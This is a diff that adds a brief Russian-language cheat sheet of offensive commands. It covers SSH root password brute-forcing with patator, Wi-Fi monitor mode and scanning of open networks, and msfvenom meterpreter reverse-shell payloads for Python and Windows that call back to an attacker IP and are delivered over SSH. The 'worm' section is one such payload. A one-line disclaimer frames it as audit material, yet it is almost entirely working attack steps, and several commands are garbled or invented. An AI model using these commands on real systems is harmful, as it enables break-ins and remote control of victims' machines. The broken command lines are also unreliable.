@@ -1,0 +1,41 @@
+1. Подбор пароля.
+Подключение удаленного соединения по протоколу SSH
+sudo nmap -p 22 _gateway/24
+sudo systemctl start ssh.socket
+ssh root@IP_АДРЕС (или имя пользователя вместо root)
+ip a (узнать ip удаленной системы)
+patator ssh_login host=IP_АДРЕС user=root password=FILE0 0=/root/wordlist -x ignore:mesg=’Authentication failed’
+(Используем утилиту patator, также можно воспользоваться Medusa или Hydra)
+
+2. Перехват и перенаправление трафика.
+посмотрим имена беспроводных интерфейсов:
+
+iw dev
+sudo ip link set ИНТЕРФЕЙС down
+sudo iw ИНТЕРФЕЙС set monitor control
+sudo ip link set ИНТЕРФЕЙС up
+
+В предыдущих командах вместо ИНТЕРФЕЙС нужно вписать то имя, которое беспроводной интерфейс 
+sudo airodump-ng ИНТЕРФЕЙС -t OPN
+Где:
+ИНТЕРФЕЙС — имя беспроводного интерфейса в вашей системе
+-t OPN — фильтр, который показывает только открытые Wi-Fi сети
+
+3. Вредоносное ПО.
+создадим вредоносное ПО с помощью meterpreter:
+msfvenom -p python / meterpreter / reverse_tcp LHOST =  IP_АДРЕС LPORT =@4444 R> encoded
+декодируем закодированную оболочку Значения должны быть похожи на случайные символы
+#  echo RANDOMVALUE | base64 --decode >> decoded.py
+Добавим в исходный файл символы
+nano decoded.py
+создадим исполняемый файл
+pyinstaller encoded.py
+воспользуемся псевдометодом get to remote после подключение по SSH
+gettoremote encoded.py
+
+4. Червь.
+SSH подключение 
+msfvenom -p windows/meterpreter/reverse_tcp lhost=IP_атакующего lport=4444 -f exe -o /tmp/my_payload.exe
+IP_атакующего – адрес атакующего, для обратного соединения с компьютера жертвы
+
+Примечание: Информация для исследования, обучения или проведения аудита. Применение в корыстных целях карается законодательством РФ.
